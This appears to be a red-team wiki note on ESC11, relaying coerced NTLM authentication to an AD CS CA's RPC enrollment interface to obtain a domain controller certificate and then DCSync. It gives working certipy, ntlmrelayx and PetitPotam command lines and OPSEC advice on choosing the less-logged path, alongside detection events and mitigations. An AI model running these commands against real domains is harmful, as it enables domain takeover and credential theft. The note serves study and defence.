---
title: "ESC11 — NTLM relay to RPC ICPR enrollment"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, ntlm, relay, rpc]
---

# ESC11

**NTLM relay to the RPC enrollment interface.** Same idea as [[esc8]], but
against the **RPC (ICPR)** enrollment endpoint instead of the web interface:
when the CA's **`IF_ENFORCEENCRYPTICERTREQUEST`** flag is **off**, the ICPR
RPC interface accepts **relayed NTLM without encryption**. Relay a coerced
machine auth into it and you get a machine-template cert — again worth
**DCSync**. It's the "no Web Enrollment installed" variant of ESC8.

## The condition

- CA exposes the **ICPR RPC** interface (the standard enrollment RPC).
- **`IF_ENFORCEENCRYPTICERTREQUEST` is unset** — relayed NTLM is accepted.
- A coercion vector ([[printer-bug]] / EFSRPC) into the relay.

## Exploit

```bash
# does the CA accept relayed RPC enrollment?
certipy find -u user@corp.local -p 'Pass' -dc-ip <DC_IP> -vulnerable -stdout

# relay over RPC instead of HTTP
impacket-ntlmrelayx -t rpc://<CA_IP> -rpc-mode ICPR \
  -icpr-ca-name 'CORP-CA' --template DomainController

# coerce as in ESC8
python3 PetitPotam.py <attacker_ip> <dc_ip>
```

Then `certipy auth` / `Rubeus asktgt /certificate` + DCSync exactly as in
[[esc8]].

## Red-team notes (OPSEC)

- **`certipy find` tells you which relay surface is open** — ESC8 (HTTP) and
  ESC11 (RPC) are often *both* open on the same CA; prefer the one with fewer
  eyes on the logs (RPC enrollment is less watched than the web UI).
- Same OPSEC as ESC8: confirm before coercing, one DC, one shot.

## Detection

- **4886/4887** on the CA for a machine-template cert with an anomalous
  source (RPC enrollment from a non-enrollment host).
- The upstream relay tells — see [[ntlm-relay-coercion]].
- RPC traffic to the CA from a workstation (ICPR is normally an
  enrollment-service-to-CA flow).

## Mitigations

- **Set `IF_ENFORCEENCRYPTICERTREQUEST`** (kill relayed NTLM over ICPR).
- Same as [[esc8]]: HTTPS+EPA on the web UI, RPC filters on DCs, uninstall
  unused enrollment interfaces.

## Links

- [[esc8]] — the web-HTTP sibling; share the coercion + endgame
- [[ad-cs-esc-attacks]] — ESC11 in the family
- [[ntlm-relay-coercion]], [[printer-bug]] — the coercion
- [[dcsync]] — the endgame
- [[certipy]], [[ntlmrelayx]]
